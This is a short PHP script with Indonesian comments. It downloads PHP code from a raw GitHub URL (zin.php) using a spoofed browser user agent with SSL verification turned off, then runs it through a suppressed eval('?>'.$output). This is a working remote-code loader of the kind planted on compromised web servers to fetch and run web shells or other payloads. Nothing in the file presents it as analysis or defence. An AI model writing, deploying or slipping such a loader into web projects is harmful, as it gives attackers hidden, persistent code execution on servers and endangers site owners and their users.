<?php
// URL yang ingin diambil kontennya
$link = 'https://github.com/kembarbaru120000/213/raw/refs/heads/main/zin.php';

// Inisialisasi cURL
$ch = curl_init();

// Set opsi cURL
curl_setopt($ch, CURLOPT_URL, $link); // Tentukan URL untuk diambil
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // Mengembalikan hasil sebagai string
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // Ikuti jika ada redireksi
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'); // Menyamar sebagai browser
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan verifikasi SSL (untuk pengujian, sebaiknya dihindari di production)

// Eksekusi cURL dan ambil konten
$output = curl_exec($ch);

// Periksa jika ada error pada cURL
if (curl_errno($ch)) {
error_log('cURL Error: ' . curl_error($ch)); // Mencatat kesalahan ke log
}

// Tutup sesi cURL
curl_close($ch);

// Menyembunyikan error dan output
if ($output) {
// Mengeksekusi output PHP yang diperoleh
@eval('?>'.$output);
} else {
// Jika tidak ada konten, log error
error_log('Gagal mendapatkan konten dari URL: ' . $link);
}
?>
